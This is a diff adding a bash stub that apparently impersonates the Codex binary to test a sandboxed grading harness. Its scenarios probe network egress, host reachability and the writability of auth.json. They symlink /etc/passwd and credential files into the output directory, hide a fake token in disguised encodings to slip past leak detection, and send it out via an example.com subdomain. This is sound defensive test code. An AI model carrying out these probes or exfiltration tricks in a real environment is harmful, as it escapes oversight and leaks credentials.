@@ -1,0 +1,118 @@
+#!/bin/bash
+# CD1 oracle stub (attempt 3): stands in for the Codex binary INSIDE the
+# checker container. Records what it can see and reach as FLAT files
+# /out/stub-* (the only shape the attempt-3 keep-list preserves), then
+# replays the scenario named by "STUB-SCENARIO: <name>" in its stdin prompt.
+if [[ "${1:-}" == "--version" ]]; then echo "codex-cli stub-9.9.9"; exit 0; fi
+prompt=$(cat)
+O=/out
+r() { cat > "$O/stub-$1"; }                        # r <name> <<< content
+S=tok_FAKE_SECRET_0123456789abcdefXYZ
+scen=$(grep -oE 'STUB-SCENARIO: [a-z0-9-]+' <<<"$prompt" | head -1 | cut -d' ' -f2)
+# the signal scenarios plant their secret FIRST, so the oracle can wait for it
+# (a file it can see in the harness's private /out) before it sends a signal
+if [[ "$scen" == slow-leak ]]; then
+  printf '%s\n' "$S" > /out/leak.txt
+  echo "{\"type\":\"item.completed\",\"item\":{\"text\":\"$S\"}}"
+fi
+grep -E ' /out | /schema ' /proc/self/mountinfo | r mounts
+ls -A /schema 2>/dev/null | LC_ALL=C sort | tr '\n' ' ' | r schema-ls
+printf '%s\n' "$@" | r argv
+{ echo "HOME=$HOME"; echo "CODEX_HOME=${CODEX_HOME:-}"; echo "HTTPS_PROXY=${HTTPS_PROXY:-}"
+  echo "HTTP_PROXY=${HTTP_PROXY:-}"; echo "GOMODCACHE=${GOMODCACHE:-}"; echo "GOPROXY=${GOPROXY:-}"
+  echo "UID=$(id -u)"; echo "GID=$(id -g)"; echo "PWD=$(pwd)"; } | r env
+(cd /work && find . -mindepth 1 \( -type f -o -type l \) -printf '%P\n' | LC_ALL=C sort) | r work-files
+{ [[ -x /work/exe.sh ]] && echo "exe:x"; [[ -L /work/link-in ]] && echo "link:L"; } | r modes
+{ [[ -x /opt/codex/codex-code-mode-host ]] && echo "host:x"; ( : >> /opt/codex/codex-code-mode-host ) 2>/dev/null && echo "host:writable" || echo "host:ro"; ls -A /opt/codex | LC_ALL=C sort | tr '\n' ' '; echo; } | r codexdir
+ls -A "${CODEX_HOME:-/nonexistent}" 2>/dev/null | LC_ALL=C sort | r codex-home-ls
+wc -c < "${CODEX_HOME:-/nonexistent}/config.toml" 2>/dev/null | r config-bytes
+sha256sum < "${CODEX_HOME:-/nonexistent}/auth.json" 2>/dev/null | cut -d' ' -f1 | r auth-sha
+{ ( : >> "${CODEX_HOME:-/nonexistent}/auth.json" ) 2>/dev/null && echo writable || echo ro; } | r auth-mode
+printf '%s' "$prompt" | r prompt
+for p in /home/darrell /home/darrell/.codex /home/darrell/bin /home/darrell/work /home/darrell/go /usr/lib/chatgpt; do
+  [[ -e "$p" ]] && echo "VISIBLE $p"
+done | r host-paths
+if [[ -d /gomodcache ]]; then
+  { if touch /gomodcache/.oracle-w 2>/dev/null; then rm -f /gomodcache/.oracle-w; echo writable; else echo readonly; fi; } | r gomodcache
+  find /gomodcache -path '*dgallion1*' 2>/dev/null | head -1 | r gomodcache-private
+  find /gomodcache -mindepth 1 2>/dev/null | wc -l | r gomodcache-count
+else echo absent | r gomodcache; fi
+if [[ -f /work/go.mod ]]; then (cd /work && go build ./... 2>&1; echo "rc=$?") | r gobuild; fi
+hp=$(grep -oE 'HOSTPROBE-PORT: [0-9]+' <<<"$prompt" | head -1 | cut -d' ' -f2)
+probe() { local name="$1"; shift; local code; code=$(curl -s -o /dev/null -w '%{http_code}' "$@" 2>/dev/null); echo "code=$code rc=$?" | r "net-$name"; }
+probe host      -m 5  --noproxy '*' "http://172.17.0.1:${hp:-1}/"
+probe denied    -m 10 https://example.com/
+probe allowed   -m 15 https://chatgpt.com/
+probe auth      -m 15 https://auth.openai.com/
+probe api       -m 15 https://api.openai.com/
+probe look1     -m 10 https://chatgpt.com.evil.invalid/
+probe look2     -m 10 https://evilchatgpt.com/
+# curl ignores uppercase HTTP_PROXY for http:// URLs, so these two name the
+# proxy explicitly — they test the PROXY's refusal, not the missing route
+probe port80    -m 10 --proxy http://proxy:8888 -p http://chatgpt.com:80/
+probe plainhttp -m 10 --proxy http://proxy:8888 http://example.com/
+probe direct    -m 5  --noproxy '*' https://chatgpt.com/
+hips=$(grep -oE 'HOSTIPS: [0-9. ]+' <<<"$prompt" | head -1 | cut -d' ' -f2-)
+myip=$(hostname -I 2>/dev/null | awk '{print $1}')
+for h in $hips ${myip%.*.*}.0.1 ${myip%.*}.1; do for p in ${hp:-1} 8080; do
+  [[ "$h" == "$myip" ]] && continue
+  if timeout 4 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null; then echo "$h:$p reachable"; else echo "$h:$p unreachable"; fi
+done; done | r net-hostips
+out=""; prev=""; for a in "$@"; do [[ "$prev" == "-o" ]] && out="$a"; prev="$a"; done
+echo "$scen" | r scenario
+NEW=tok_ROTATED_SECRET_9876543210zyxwvUT
+PASSJ='{"verdict":"PASS","criteria":[{"id":"a","attack":"x","command":"c","result":"r","pass":true}],"observations":[]}'
+J() { printf '%s\n' "$1" > "$out"; }
+echo '{"type":"thread.started","thread_id":"stub"}'
+case "$scen" in
+  pass) J '{"verdict":"PASS","criteria":[{"id":"crit-a","attack":"tried X","command":"echo stub-cmd-a","result":"stub-res-a","pass":true},{"id":"crit-b","attack":"tried Y","command":"echo stub-cmd-b","result":"stub-res-b","pass":true}],"observations":["stub-obs-1"]}' ;;
+  fail) J '{"verdict":"FAIL","criteria":[{"id":"crit-a","attack":"tried X","command":"echo stub-cmd-a","result":"broke it","pass":false}],"observations":[]}' ;;
+  evidence-free) J '{"verdict":"PASS","criteria":[{"id":"a","attack":"looked","command":"  ","result":"fine","pass":true}],"observations":[]}' ;;
+  invalid)       J '{"verdict":"MAYBE","criteria":[]}' ;;
+  invalid-noobs) J '{"verdict":"PASS","criteria":[{"id":"a","attack":"x","command":"c","result":"r","pass":true}]}' ;;
+  invalid-extra) J '{"verdict":"PASS","criteria":[{"id":"a","attack":"x","command":"c","result":"r","pass":true,"note":"x"}],"observations":[]}' ;;
+  pass-inconsistent) J '{"verdict":"PASS","criteria":[{"id":"a","attack":"x","command":"c","result":"r","pass":false}],"observations":[]}' ;;
+  fail-inconsistent) J '{"verdict":"FAIL","criteria":[{"id":"a","attack":"x","command":"c","result":"r","pass":true}],"observations":[]}' ;;
+  leak) J "{\"verdict\":\"PASS\",\"criteria\":[{\"id\":\"a\",\"attack\":\"x\",\"command\":\"cat /codex-home/auth.json\",\"result\":\"$S\",\"pass\":true}],\"observations\":[]}" ;;
+  echo-secret) echo "{\"type\":\"item.completed\",\"item\":{\"text\":\"saw $S\"}}"; J "$PASSJ" ;;
+  trunc-auth) { ( : > "${CODEX_HOME}/auth.json" ) 2>/dev/null && echo truncated || echo refused; } | r trunc
+           J "{\"verdict\":\"PASS\",\"criteria\":[{\"id\":\"a\",\"attack\":\"x\",\"command\":\"c\",\"result\":\"$S\",\"pass\":true}],\"observations\":[]}" ;;
+  leak-ro) printf 'x %s x\n' "$S" > /out/readonly.txt; chmod 444 /out/readonly.txt
+           printf '%s\n' "$S" > /out/m000.txt; chmod 000 /out/m000.txt
+           mkdir -p /out/locked; printf '%s\n' "$S" > /out/locked/inner.txt; chmod 000 /out/locked; J "$PASSJ" ;;
+  deep) ( cd /out && n=$(printf 'd%.0s' $(seq 1 200)); for i in $(seq 1 25); do mkdir "$n" && cd "$n" || exit; done
+          printf '%s\n' "$S" > deep.txt && [[ -f deep.txt ]] && echo planted || echo not-planted ) | r deep-planted
+        J "$PASSJ" ;;
+  linkout) ln -s /codex-home/auth.json /out/auth-link; ln -s /etc/passwd /out/pw-link; mkdir -p /out/sub; echo x > /out/sub/y.txt; J "$PASSJ" ;;
+  esckey) python3 -c "import sys; s=sys.argv[1]; print('{\"' + ''.join('\\\\u%04x' % ord(c) for c in s) + '\": 1}')" "$S" > /out/esckey.json; J "$PASSJ" ;;
+  utf16) python3 -c "import sys; open('/out/u16.bin','wb').write(sys.argv[1].encode('utf-16-le'))" "$S"; J "$PASSJ" ;;
+  many) for i in $(seq -w 1 70); do echo "f$i" > "/out/f$i.txt"; done; J "$PASSJ" ;;
+  big) head -c 1048576 /dev/zero > /out/exact.bin; head -c 1048577 /dev/zero > /out/over.bin; J "$PASSJ" ;;
+  secretname) echo clean > "/out/$S"; ln -s /etc/hostname "/out/${S}-link"; J "$PASSJ" ;;
+  forms) python3 -c "import sys; open('/out/u16be.bin','wb').write(sys.argv[1].encode('utf-16-be'))" "$S"
+         python3 -c "import sys; s=sys.argv[1]; open('/out/partial.txt','w').write('x ' + s[:4] + ''.join('\\\\u%04x' % ord(c) for c in s[4:9]) + s[9:] + ' y')" "$S"
+         python3 -c "import sys; s=sys.argv[1]; print('{\"type\":\"item.completed\",\"item\":{\"text\":\"' + ''.join('\\\\u%04x' % ord(c) for c in s) + '\"}}')" "$S"
+         J "$PASSJ" ;;
+  proxyleak) curl -s -m 8 -o /dev/null "https://$S.example.com/" 2>/dev/null; J "$PASSJ" ;;
+  lastlink) ln -s /etc/hostname "$out" ;;
+  lastbig) python3 -c "import json; print(json.dumps({'verdict':'PASS','criteria':[{'id':'a','attack':'x'*4200000,'command':'c','result':'r','pass':True}],'observations':[]}))" > "$out" ;;
+  longerr) long=$(printf 'X%.0s' $(seq 1 200)); echo "{\"type\":\"error\",\"message\":\"429 Too Many Requests usage limit token $long$S$long\"}"; exit 1 ;;
+  slow-leak) sleep 30; J "$PASSJ" ;;
+  rotate-old) sleep 12; J "{\"verdict\":\"PASS\",\"criteria\":[{\"id\":\"a\",\"attack\":\"x\",\"command\":\"c\",\"result\":\"$S\",\"pass\":true}],\"observations\":[]}" ;;
+  rotate-new) sleep 12; printf '%s\n' "$NEW" > /out/new.txt; J "$PASSJ" ;;
+  notools) echo '{"type":"item.completed","item":{"id":"item_0","type":"error","message":"Code Mode is unavailable because failed to spawn code-mode host: host executable was not found"}}'
+           J '{"verdict":"FAIL","criteria":[{"id":"a","attack":"x","command":"c","result":"could not execute","pass":false}],"observations":[]}' ;;
+  tools-words) echo '{"type":"item.completed","item":{"type":"agent_message","text":"the README says code mode is unavailable when it failed to spawn"}}'; J "$PASSJ" ;;
+  quota) echo '{"type":"error","message":"429 Too Many Requests: You have hit your usage limit"}'; exit 1 ;;
+  quota-stderr) echo "stream error: usage limit reached" >&2; exit 1 ;;
+  quota-auth) echo '{"type":"error","message":"429 usage limit; also 401 Unauthorized"}'; exit 1 ;;
+  auth)  echo '{"type":"error","message":"401 Unauthorized: your refresh token has expired"}'; exit 1 ;;
+  incidental) echo '{"type":"item.completed","item":{"text":"README mentions a quota of 429 and log in steps"}}'; exit 3 ;;
+  reqid) echo '{"type":"error","message":"stub internal failure","request_id":"req_4291","code":"http_401"}'; exit 3 ;;
+  noout) exit 0 ;;
+  crash) echo '{"type":"error","message":"stub internal failure"}'; exit 3 ;;
+  hang)  sleep 120 ;;
+  *) echo '{"type":"error","message":"stub: no scenario"}'; exit 4 ;;
+esac
+echo '{"type":"turn.completed"}'
+exit 0
